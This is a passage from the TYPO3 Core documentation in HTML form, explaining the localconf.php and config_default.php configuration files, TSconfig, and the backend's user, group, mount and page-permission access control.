CLASS="western"><FONT COLOR="#ff8000">//&nbsp;&nbsp;Modified or inserted by Typo3 Install Tool.<BR>// Updated by Typo3 Install Tool 14-02-2003 15:20:04<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'EXT'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'extList'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">] = </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'install,phpmyadmin,setup,info_pagetsconfig'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Modified or inserted by Typo3 Extension Manager. <BR>// Updated by Typo3 Extension Manager 19-02-2003 12:47:26<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">In this example the lines until the &quot;##
INSTALL SCRIPT EDIT POINT TOKEN...&quot; were manually added during
the setup of the  installation. But all lines after that point was
added either by the Install Tool or by the Extension Manager. You can
also see how the Extension Manager has overridden the formerly set
value for &quot;extList&quot; - the list of installed extensions.
This line in localconf.php is automatically found by the Extension
Manager and next time an extensions is installed/removed this line
will be modified.</P>
<P CLASS="western">As you can see the localconf.php file must be
writeable for the Install Tool and Extension Manager to work
correctly.</P>
<H3 CLASS="western"><A NAME="2.3.2.config_default.php|outline"></A>config_default.php</H3>
<P CLASS="western">The localconf.php file and equivalents from
extensions are included from the config_default.php file. This file
will set the default values in the $TYPO3_CONF_VARS array. This is
also the ultimate source for information about each configuration
option available! So please take a look into the source code of that
file if you want to browse the full array of options you can apply!</P>
<P CLASS="western">This is a snippet from that file:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>* TYPO3 default configuration<BR>*<BR>* TYPO3_CONF_VARS is a global array with configuration for the TYPO3 libraries<BR>* THESE VARIABLES MAY BE OVERRIDDEN FROM WITHIN localconf.php<BR>*<BR>* 'IM' is short for 'ImageMagick', which is an external image manipulation package available from www.imagemagick.org. Version is ABSOLUTELY preferred to be 4.2.9, but may be 5+. See the install notes for TYPO3!!<BR>* 'GD' is short for 'GDLib/FreeType', which are libraries that should be compiled into PHP4. GDLib &lt;=1.3 supports GIF, while the latest version 1.8.x and 2.x supports only PNG. GDLib is available from www.boutell.com/gd/. Freetype has a link from there.<BR>*<BR>* @author&nbsp;&nbsp;&nbsp;&nbsp;Kasper Skårhøj &lt;kasper@typo3.com&gt;<BR>* Revised for TYPO3 3.6 2/2003 by Kasper Skårhøj<BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">if (!</FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">defined </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">(</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'PATH_typo3conf'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">)) &nbsp;&nbsp;&nbsp;&nbsp;die (</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'The configuration path was not properly defined!'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">);<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= Array(<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'GFX' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; array(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Configuration of the image processing features in TYPO3. 'IM' and 'GD' are short for ImageMagick and&nbsp;&nbsp;GD library respectively.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'image_processing' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">1</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Boolean. Enables image processing features. Disabling this means NO image processing with either GD or IM!<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'thumbnails' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">1</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Boolean. Enables the use of thumbnails in the </FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">backend interface. Thumbnails are generated by IM/partly GD in the file typo3/thumbs.php<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'thumbnails_png' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">0</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Bits. Bit0: If set, thumbnails from non-jpegs will be 'png', otherwise 'gif' (0=gif/1=png). Bit1: Even JPG's will be converted to png or gif (2=gif/3=png)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'gif_compress' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">1</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Boolean. Enables the use of the t3lib_div::gif_compress() workaround function for compressing giffiles made with GD or IM, which probably use only RLE or no compression at all.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">...[and it goes on!]...</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000"><BR><BR></FONT></CODE></PRE><H3 CLASS="western">
<A NAME="2.3.3.Install Tool|outline"></A>Install Tool</H3>
<P CLASS="western">In relation to configuration the Install Tool does
some configuration automatically from the Basic Configuration menu
item. But specifically the menu item &quot;All Configuration&quot;
will list all options found in $TYPO3_CONF_VARS and also read out the
comments from the config_default.php file! So this is basically the
visual editor of the $TYPO3_CONF_VARS variable!</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_6a55faa5.png" NAME="Graphic34" ALIGN=LEFT WIDTH=669 HEIGHT=415 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.3.4.Browsing $TYPO3_CONF_VARS values|outline"></A>
Browsing $TYPO3_CONF_VARS values</H3>
<P CLASS="western">In the module Tools&gt;Configuration (extension
key: lowlevel), you can also browse the $TYPO3_CONF_VARS array and
its values:</P>
<P CLASS="western"><IMG SRC="10_html_m51aec099.png" NAME="Graphic35" ALIGN=LEFT WIDTH=466 HEIGHT=539 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>Notice:</B> This module is merely a browser
letting you comfortably investigate the values configured - you can
<I>not </I>change the values (although it might seem an obvious thing
to add). There are currently no plans about adding that capability. 
</P>
<H3 CLASS="western"><A NAME="2.3.5.User and Page TSconfig|outline"></A>
User and Page TSconfig</H3>
<P CLASS="western">&quot;User TSconfig&quot; and &quot;Page TSconfig&quot;
are very flexible concepts for adding fine-grained configuration of
the backend of TYPO3. It is text-based configuration system where you
assign values to keyword-strings entered in a database table field.
The syntax used is TypoScript. There is a document, <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw">&quot;TSconfig&quot;,
describing in detail how it works</A> and which options it includes.</P>
<H4 CLASS="western">User TSconfig</H4>
<P CLASS="western">User TSconfig can be set for each backend user and
group. Configuration set for backend groups is inherited by the user
who is a member of those groups. The available options typically
cover user settings like those found in the User&gt;Setup module (in
fact options from that module can be forcibly overridden from User
TSconfig!), configuration of the &quot;Admin Panel&quot; (frontend),
various backend tweaks (lock user to IP, show shortcut frame, may
user clear all cache?, width of the navigation frame etc.) and
backend module configuration (overriding any configuration set for
backend modules in Page TSconfig).</P>
<P CLASS="western">You can find more <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw#User%20TSconfig%7Coutline">details
about User TSconfig in the &quot;TSconfig&quot; document</A>.</P>
<H4 CLASS="western">Page TSconfig</H4>
<P CLASS="western">Page TSconfig can be set for each page in the page
tree. Tree branches inherit configuration for pages closer to the
tree root. The available options typically cover backend module
configuration which means that modules related to page ids (those in
the &quot;Web&quot; main module) can be configured for different
behaviours in different branches of the tree. It also includes
configuration of TCEforms and TCEmain including Rich Text Editor
behaviours. Again, the point is that the configuration is active for
certain branches of the page tree which is very practical in projects
running many sites in the same page tree.</P>
<P CLASS="western">You can find more <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw#Page%20TSconfig%7Coutline">details
about Page TSconfig in the &quot;TSconfig&quot; document</A>.</P>
<H2 CLASS="western"><A NAME="2.4.Access Control|outline"></A>Access
Control</H2>
<H3 CLASS="western"><A NAME="2.4.1.Users and groups|outline"></A>Users
and groups</H3>
<P CLASS="western">TYPO3 features an access control system based on
users and groups. 
</P>
<H4 CLASS="western">Users</H4>
<P CLASS="western">Each user of the backend must be represented with
a single record in the table &quot;be_users&quot;. This record
contains the username and password, other meta data and some
permissions settings. 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_7394381d.png" NAME="Graphic44" ALIGN=LEFT WIDTH=432 HEIGHT=351 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The above screenshot shows a part of the editing
form for the backend user with uid=2 and username='guest'. The user
is a member of the group 'guest_group' and has English as the default
language.</P>
<H4 CLASS="western">Groups</H4>
<P CLASS="western">Each user can also be a member of one or more
groups (from the be_groups table) and each group can include
sub-groups. Groups contain the main permission settings you can set
for a user. Many users can be a member of the same group and thus
share permissions.</P>
<P CLASS="western">When a user is a member of many groups (including
sub-groups) then the permission settings are added together so that
the more groups a user is a member of, then more access is granted to
him.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_6cfe1391.png" NAME="Graphic43" ALIGN=LEFT WIDTH=426 HEIGHT=172 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">This screenshot shows the field for the group
title - there are many more fields for access settings! See the
following pages.</P>
<H4 CLASS="western">The &quot;admin&quot; user</H4>
<P CLASS="western">A user can have a single flag set called &quot;Admin&quot;.
If this is set the user doesn't need any further access settings
since this will grant TOTAL access to the system in the backend!
There can be no real limitations to what an &quot;admin&quot; user
can do! Like the &quot;root&quot;-user on a UNIX system.</P>
<P CLASS="western">All systems must have at least one &quot;admin&quot;
user and most systems should have <I>only</I> one &quot;admin&quot;
user. It should probably be the developer with the total
understanding of the system. Not even &quot;super users&quot; should
be allowed &quot;admin&quot; access since that will most likely grant
them access to more than they need.</P>
<P CLASS="western">Admin-users are easily recognized since they have
a red icon.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_1b450dc4.png" NAME="Graphic42" ALIGN=LEFT WIDTH=188 HEIGHT=177 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">A level between &quot;admin&quot; users and
ordinary users</H4>
<P CLASS="western">It has often been requested to have more access
levels between &quot;admin&quot; users and normal users in a system.
This is particularly true when TYPO3 works as a CMS and some users
should have access to TypoScript templates in the Web &gt; Template
module.</P>
<P CLASS="western">The reason why this is not possible to allow for
normal users is that it fails the &quot;PHP-execution criteria&quot;.
By allowing users to alter TypoScript values in frontend templates
you also offer them a way to execute custom PHP code on the server -
which in turn means they can create a full &quot;admin&quot; account
for themselves easily.</P>
<P CLASS="western">The &quot;PHP-execution criteria&quot; is
typically the reason why a certain level of access is not possible to
grant non-admin users - simply because they may be able to escalate
their rights if they could.</P>
<H4 CLASS="western">Location of users and groups</H4>
<P CLASS="western">Since both backend users and backend groups are
represented by records in the database they are edited just as any
other record in the system. However backend users and groups are
configured to exist <I>only  </I>in the root of the page tree where
<I>only</I> &quot;admin&quot; users have access:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_50506b00.png" NAME="Graphic41" ALIGN=LEFT WIDTH=669 HEIGHT=202 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">This screenshot shows two backend users, &quot;guest&quot;
(regular user - blue) and &quot;admin&quot; (admin user - red),
located in the root of the page tree together with the group
&quot;guest_group&quot;. To edit the users and groups just click the
icon and select &quot;Edit&quot; as you would edit any other record.
Even creation of new users and groups is done with similar basic
tools of the TYPO3 core.</P>
<P CLASS="western">Records located in the page tree root are
identified by having their &quot;pid&quot; fields set to zero. The
&quot;pid&quot; field normally contains the relation to the page
where a record belongs. Since no pages can have the id of zero, this
is the id of the root. Notice that only &quot;admin&quot; users can
edit records in the page root! If you want non-admin users (eg. a
super user) to create new users, please install the &quot;sys_action&quot;
extension which supplies an &quot;action&quot; for doing just that.</P>
<H3 CLASS="western"><A NAME="2.4.2.Roles|outline"></A>Roles</H3>
<P CLASS="western">Another approach to setting up users is very
popular - roles. This concept is basically about identifying certain
roles that users can take and then allow for a very easy application
of these roles to users.</P>
<P CLASS="western">TYPO3s access control is far more flexible and
allows for so detailed configuration that it lies very far from the
simple and straight forward concept of roles. This is necessary as
the foundation if a system like TYPO3 should fit many possible
usages. 
</P>
<P CLASS="western">However &quot;roles&quot; are possible to <I>create</I>!
You simply have to see user-groups as representing roles! So what you
do is to:</P>
<OL>
	<LI><P CLASS="western">Identify the roles you need; Developer,
	Administrator, Editor, Super User, User, ... etc.</P>
	<LI><P CLASS="western">Configure a group for each role. This group
	so configure the access permissions for each role.</P>
	<LI><P CLASS="western">Consider having a general group which all
	other groups includes - this would basically configure a shared set
	of permissions for all users.</P>
</OL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">So &quot;roles&quot; are simply user groups
defined to work as roles. However we might still spend some efforts
to make some public recommendations for roles as a guideline for
people (since the configuration of these roles will otherwise be a
lot of work) and further the native access control options in the
TYPO3 core might need some extending in order to accommodate all
needed role configurations.</P>
<H3 CLASS="western"><A NAME="2.4.3.LDAP|outline"></A>LDAP</H3>
<P CLASS="western">Authentication in TYPO3 is done via the services
API and there exist services which allow alternative authentication
methods like LDAP. Please search the extension repository for
solutions.</P>
<H3 CLASS="western"><A NAME="2.4.4.Access Control options|outline"></A>
Access Control options</H3>
<P CLASS="western">A fully initialized backend user has the
permissions granted to him by his own user record and all the user
groups he is a member of. These permissions go into the following
conceptual categories: 
</P>
<OL>
	<LI><P CLASS="western"><B>Access lists<BR></B>These grant access to
	backend modules, database tables and fields.</P>
	<LI><P CLASS="western"><B>Mounts<BR></B><SPAN STYLE="font-weight: normal">P</SPAN>arts
	of the page tree and server file system.</P>
	<LI><P CLASS="western"><B>Page permissions</B><BR>Access to work on
	individual pages based on the user id and group ids.</P>
	<LI><P CLASS="western"><B>User TSconfig</B><BR>A flexible and
	hierarchical configuration structure defined by TypoScript syntax.
	This typically describes &quot;soft&quot; permission settings and
	options for the user which can be used to customize the backend and
	individual modules.</P>
</OL>
<H4 CLASS="western">Online help!</H4>
<P CLASS="western">Before discussing each category, please notice
that the online help is quite extensive and useful as well. Click one
of the Help Icons in relation to either users or groups and you can
get a full description of the table:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_65aa0cef.png" NAME="Graphic46" ALIGN=LEFT WIDTH=669 HEIGHT=382 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">Access lists</H4>
<P CLASS="western">Access lists are defined in the user groups and
includes</P>
<OL>
	<LI><P CLASS="western"><B>Positivelist of main/submodule.</B><BR>Which
	modules appear here depends on the access configuration of the
	individual modules!<BR>Access to modules is permitted if 1) the
	module has no restrictions (the $MCONF array for the module
	specifies this) or 2) if the user has the module included by the
	positivelist or 3) is an &quot;admin&quot; user (of course). <BR>Users
	must have access to the main module in order to see the sub-modules
	inside listed in the menu. So to have &quot;Web&gt;List&quot; in the
	module menu the user must have access to &quot;Web&quot;. Please
	notice that the core module &quot;Tools&quot; is defined to be for
	&quot;admin&quot; users only and thus sub-modules to &quot;Tools&quot;
	will only appear in the menu for &quot;admin&quot; users.<BR><B>Notice:</B>
	As the only one of the access lists, the module list is also
	available in the be_users records!</P>
	<LI><P CLASS="western"><B>Positivelist of tables that are shown in
	listings (eg. in Web&gt;List).</B> <BR>Notice: This list has the
	list of tables for editing (see below) appended. So tables listed
	for modification need not be included in this list as well!</P>
	<LI><P CLASS="western"><B>Positivelist of tables that may be edited.</B>
	<BR>The list includes all tables from the $TCA array.</P>
	<LI><P CLASS="western"><B>Positivelist of pageTypes (pages.doktype)
	that can be selected.</B></P>
	<P CLASS="western">Choice of pageTypes (doktype) for a page is
	associated with: 
	</P>
	<OL>
		<LI><P CLASS="western">An special icon for the page.</P>
		<LI><P CLASS="western">Permitted tables on the page (see
		<A HREF="#$PAGES_TYPES%7Coutline">$PAGES_TYPES global variable</A>).</P>
		<LI><P CLASS="western">If the pageType is 
		</P>
		<OL>
			<LI><P CLASS="western">Web-page type (doktype&lt;200, can be seen
			in 'cms' frontend)</P>
			<LI><P CLASS="western">SysFolder type (doktype &gt;=200, can <I>not
			</I>be seen in 'cms' frontend)</P>
		</OL>
	</OL>
	<LI><P CLASS="western"><B>Positivelist of &quot;excludefields&quot;
	that are not excluded.</B> <BR>&quot;Excludefields&quot; are fields
	in tables that have the &quot;'exclude' =&gt; 1&quot; flag set in
	$TCA. If such a field is <I>not</I> found in the list of &quot;Allowed
	Excludefields&quot; then the user cannot edit it! So &quot;Allowed
	Excludefields&quot; adds <I>explicit</I> permission to edit that
	field.</P>
	<LI><P CLASS="western"><B>Explicitly allow/deny field values<BR></B><SPAN STYLE="font-weight: normal">This
	list of checkboxes can be used to allow or deny access to specific
	values of selector boxes in TYPO3 tables. Some selectorboxes is
	configured to have their values access controlled. In each case the
	mode can be that access is explicitly allowed or explicitly denied.
	This list shows all values that are under such access control.</SPAN></P>
	<LI><P CLASS="western"><B>Limit to languages<BR></B><SPAN STYLE="font-weight: normal">By
	default users can edit records regardless of what language they are
	assigned to. But using this list you can limit the user group
	members to edit only records localized to a certain language.<BR>There
	is also a similar list of languages for each user record as
	well.<BR>Technical note; To enable localization access control for a
	table you need to define the field containing the languages. This is
	done with the TCA/”ctrl” directive “languageField”. See
	“TYPO3 Core API” for more details.</SPAN></P>
	<LI><P CLASS="western"><B>Custom module options<BR></B><SPAN STYLE="font-weight: normal">This
	item can contain custom permission options added by extensions.</SPAN></P>
</OL>
<P CLASS="western">This screendump shows how the addition of elements
to the access lists can be done for a user group. Notice that the
&quot;Include Access Lists&quot; flag is set - if this is not set,
the access lists of a user group is ignored!</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m699437fd.png" NAME="Graphic45" ALIGN=LEFT WIDTH=417 HEIGHT=522 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The lists of possible values for access lists are
automatically updated when new tables, fields, modules and doktypes
are added by extensions!</P>
<P CLASS="western">When a user is a member of more than one group,
the access lists for the groups are &quot;added&quot; together.</P>
<H4 CLASS="western">Mounts</H4>
<P CLASS="western">TYPO3 natively supports two kinds of hierarchical
tree structures: The page tree (Web module) and the folder tree (File
module). Each tree is generated based on the <I>mount points</I>
configured for the user. So a page tree is drawn from the &quot;DB
Mount&quot; which is one or more page ids telling the core from which
&quot;root-page&quot; to draw the tree(s). Likewise is the folder
tree drawn based on filemounts configured for the user.</P>
<P CLASS="western"><B>DB mounts</B> (page mounts) are easily set by
simply pointing out the page that should be mounted for the user:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_1ac0d6af.png" NAME="Graphic47" ALIGN=LEFT WIDTH=416 HEIGHT=255 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">If this page, 'Root page A' is mounted for a user,
he will see this page tree:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_13ea4131.png" NAME="Graphic48" ALIGN=LEFT WIDTH=231 HEIGHT=154 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Notice:</B> A DB mount will appear <I>only if 
the page permissions allows the user read access</I> to the mounted
page (and subpages) - otherwise no tree will appear!</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>File mounts </B>are a little more difficult to
set up. First you have to create a &quot;Filemount&quot; record in
the root:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m2404568b.png" NAME="Graphic49" ALIGN=LEFT WIDTH=343 HEIGHT=136 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Then you have to assign that mount to the user or
group:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4b649062.png" NAME="Graphic50" ALIGN=LEFT WIDTH=455 HEIGHT=217 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">If the filemount was successfully mounted, it will
appear like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m7223ad54.png" NAME="Graphic51" ALIGN=LEFT WIDTH=241 HEIGHT=164 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Notice: </B>A filemount will work only if the
mounted path is accessible for PHP on the system. Further the path
being mounted must be found within TYPO3_CONF_VARS[BE][lockRootPath]
(for absolute paths) or within
PATH_site+TYPO3_CONF_VARS[BE][fileadminDir] (for relative paths) -
otherwise the path will not be mounted.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>General notes on mountpoints</B></P>
<P CLASS="western">DB and File mounts can be set for both the user
and group records. Having more than one DB or File mount will just
result in more than one mountpoint appearing in the trees. However
the backend users records have two flags which determines whether the
DB/File mounts of <I>the usergroups</I> of the user will be mounted
as well! Make sure to set these flags if mountpoints from the member
groups should be mounted in addition to the &quot;private&quot;
mountpoints set for the user:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m414586e1.png" NAME="Graphic52" ALIGN=LEFT WIDTH=440 HEIGHT=54 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">&quot;Admin&quot; users will not need a mountpoint
being set - they have by default the page tree root mounted which
grants access to all branches of the tree. Further the &quot;fileadmin/&quot;
dir will be mounted by default for admin users (provided that
TYPO3_CONF_VARS[BE][fileadminDir] is set to &quot;fileadmin/&quot;
which it is by default).</P>
<H4 CLASS="western">Page permissions</H4>
<P CLASS="western">Page permissions is designed to work like file
permissions on UNIX systems: Each page record has an owner user and
group and then permission settings for the owner, the group and
&quot;everybody&quot;. This is summarized here:</P>
<UL>
	<LI><P CLASS="western">Every page has an owner, group and
	everybody-permission</P>
	<LI><P CLASS="western">The owner and group of a page can be empty.
	Nothing matches with an empty user/group (except &quot;admin&quot;
	users).</P>
</UL>
<UL>
	<LI><P CLASS="western">Every page has permissions for owner, group
	and everybody in these five categories: 
	</P>
</UL>
<P CLASS="western">	1	Show: See/Copy page and the pagecontent. 
</P>
<P CLASS="western">	16	Edit pagecontent: Change/Add/Delete/Move
pagecontent. 
</P>
<P CLASS="western">	2	Edit page: Change/Move the page, eg. change
title, startdate, hidden. 
</P>
<P CLASS="western">	4	Delete page: Delete the page and pagecontent. 
</P>
<P CLASS="western">	8	New pages: Create new pages under the page. 
</P>
<P CLASS="western">(Definition: &quot;Pagecontent&quot; means all
records (except from the &quot;pages&quot;-table) related to that
page.)</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Page permissions are set and viewed by the module
&quot;Access&quot;:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m354ffd3b.png" NAME="Graphic53" ALIGN=LEFT WIDTH=669 HEIGHT=293 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Editing permissions for a page is done by clicking
the edit icon:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m4e180b96.png" NAME="Graphic54" ALIGN=LEFT WIDTH=450 HEIGHT=342 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Here you can set owner user/group and the
permission matrix for the five categories / owner, group, everybody.
Notice that permissions can be set recursively if you select that
option in the selector box just above the &quot;Save&quot;/&quot;Abort&quot;
buttons.</P>
<P CLASS="western">A user must be &quot;admin&quot; <I>or</I> the
owner of a page in order to edit its permissions.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><B>New pages and records.</B></P>
<P CLASS="western">When a user creates new pages in TYPO3 they will
by default get the creating user as owner. The owner group will be
set to the <I>first listed user group</I> configured for the users
record (if any) (available in $BE_USER-&gt;firstMainGroup). These
defaults can be <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw#Page%20TSconfig%7Coutline">changed
through Page TSconfig</A>.</P>
<P CLASS="western">If you wish to change the default values
user/group/everybody it can be done by
TYPO3_CONF_VARS[BE][defaultPermissions] (please read comments in the
source code of config_defaults.php).</P>
<H4 CLASS="western">User TSconfig</H4>
<P CLASS="western">User TSconfig is a hierarchical configuration
structure entered in plain text TypoScript. It can be used by all
kinds of applications inside of TYPO3 to retrieve customized settings
for users which relates to a certain module or part. The options
available is described in the <A HREF="/home/shafiq/Sites/typo3/doc_core_tsconfig/doc/manual.sxw#User%20TSconfig%7Coutline">document
TSconfig</A>.</P>
<P CLASS="western">A good example is to look at the script
'alt_main.php' in which the shortcut frame is displayed in the
frameset only if the User TSconfig option &quot;options.shortcutFrame&quot;
is true:</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#007700">if (</FONT><FONT COLOR="#0000bb">$BE_USER</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">getTSConfigVal</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'options.shortcutFrame'</FONT><FONT COLOR="#007700">))&nbsp;&nbsp;&nbsp;&nbsp;{....</FONT></PRE><P CLASS="western">
Likewise other scripts and modules in TYPO3 is able to acquire a
value from the User TSconfig field.</P>
<P CLASS="western">So if we wanted to enable the shortcut frame for a
user we would set the TSconfig field of the user record (or any
member group!) like this:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_1e2f318a.png" NAME="Graphic55" ALIGN=LEFT WIDTH=426 HEIGHT=88 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">... or alternatively this (which is totally the
same, just another way of entering values in TypoScript syntax):</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5d0c4bb6.png" NAME="Graphic56" ALIGN=LEFT WIDTH=428 HEIGHT=88 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Precedence order of TSconfig:</B></P>
<P CLASS="western">The TSconfig of the users <I>own</I> record
(be_users) will be included <I>last</I> so any option in the
&quot;be_users&quot; TSconfig field can override options from the
groups or the default TSconfig which was previously set.</P>
<P CLASS="western">Further notice that the
TYPO3_CONF_VARS[BE][defaultUserTSconfig] value can be configured with
default TSconfig for all be_users.</P>
<P CLASS="western">&quot;Admin&quot; users further has a minor set of
default TSconfig as well:</P>
